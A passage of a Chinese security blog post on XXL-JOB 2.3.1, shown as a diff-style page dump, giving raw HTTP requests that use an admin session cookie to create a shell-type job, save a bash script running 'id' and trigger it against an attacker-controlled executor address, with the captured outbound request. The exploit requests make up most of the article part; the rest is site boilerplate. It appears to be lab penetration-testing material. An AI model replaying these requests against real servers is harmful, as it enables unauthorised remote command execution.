+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxl-job-admin/jobinfo/add</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.130:8080<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d; Path=/; HttpOnly<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>320<br><br><span class="language-freedesktop"><span class="hljs-attr">jobGroup</span><span class="hljs-operator">=</span>1&amp;jobDesc<span class="hljs-operator">=</span>poc_jobinfo&amp;author<span class="hljs-operator">=</span>pentest&amp;alarmEmail<span class="hljs-operator">=</span>&amp;scheduleType<span class="hljs-operator">=</span>CRON&amp;scheduleConf<span class="hljs-operator">=</span>0+0+0+*+*+%3F&amp;glueType<span class="hljs-operator">=</span>GLUE_SHELL&amp;executorHandler<span class="hljs-operator">=</span>&amp;executorParam<span class="hljs-operator">=</span>&amp;executorRouteStrategy<span class="hljs-operator">=</span>FIRST&amp;childJobId<span class="hljs-operator">=</span>&amp;misfireStrategy<span class="hljs-operator">=</span>DO_NOTHING&amp;executorBlockStrategy<span class="hljs-operator">=</span>SERIAL_EXECUTION&amp;executorTimeout<span class="hljs-operator">=</span>0&amp;executorFailRetryCount<span class="hljs-operator">=</span>0&amp;glueRemark<span class="hljs-operator">=</span>pentest+poc&amp;glueSource<span class="hljs-operator">=</span></span><br></code></pre></td></tr></table></figure>
+
+<p>4、写入GLUE</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxl-job-admin/jobcode/save</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.130:8080<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d; Path=/; HttpOnly<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>84<br><br><span class="language-apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">4</span>&amp;glueSource=%<span class="hljs-number">23</span>%<span class="hljs-number">21</span>%<span class="hljs-number">2</span>Fbin%<span class="hljs-number">2</span>Fbash%<span class="hljs-number">0</span>Aid%<span class="hljs-number">0</span>A&amp;glueRemark=pentest+poc</span><br></code></pre></td></tr></table></figure>
+
+<p>5、带任意addressList触发</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxl-job-admin/jobinfo/trigger</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.130:8080<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d; Path=/; HttpOnly<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>78<br><br><span class="language-freedesktop"><span class="hljs-attr">id</span><span class="hljs-operator">=</span>4&amp;executorParam<span class="hljs-operator">=</span>&amp;addressList<span class="hljs-operator">=</span>http://10.10.10.128:4545/</span><br></code></pre></td></tr></table></figure>
+
+<p>6、攻击机</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/run</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.128:4545<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">Accept-Charset</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">XXL-JOB-ACCESS-TOKEN</span><span class="hljs-punctuation">: </span>default_token<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Java/1.8.0_332<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>279<br><br><span class="language-dns">&#123;<span class="hljs-string">&quot;jobId&quot;</span>:<span class="hljs-number">4</span>,<span class="hljs-string">&quot;executorHandler&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;executorParams&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;executorBlockStrategy&quot;</span>:<span class="hljs-string">&quot;SERIAL_EXECUTION&quot;</span>,<span class="hljs-string">&quot;executorTimeout&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;logId&quot;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&quot;logDateTime&quot;</span>:<span class="hljs-number">1791618132326</span>,<span class="hljs-string">&quot;glueType&quot;</span>:<span class="hljs-string">&quot;GLUE_SHELL&quot;</span>,<span class="hljs-string">&quot;glueSource&quot;</span>:<span class="hljs-string">&quot;#!/bin/bash<span class="hljs-char escape_">\n</span>id<span class="hljs-char escape_">\n</span>&quot;</span>,<span class="hljs-string">&quot;glueUpdatetime&quot;</span>:<span class="hljs-number">1791618132000</span>,<span class="hljs-string">&quot;broadcastIndex&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;broadcastTotal&quot;</span>:<span class="hljs-number">1</span>&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>xxl-job-2.3.1</div>
+      <div>http://example.com/2026/10/10/xxl-job-2-3-1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>yangyanang</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年10月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/10/10/%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/" title="面试笔记">
+                        <span class="hidden-mobile">面试笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    
+      <script type="text/javascript">
+        var disqus_config = function() {
+          this.page.url = 'http://example.com/2026/10/10/xxl-job-2-3-1/';
+          this.page.identifier = '/2026/10/10/xxl-job-2-3-1/';
+        };
+        Fluid.utils.loadComments('#disqus_thread', function() {
+          var d = document, s = d.createElement('script');
+          s.src = '//' + 'fluid' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        });
+      </script>
+    
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
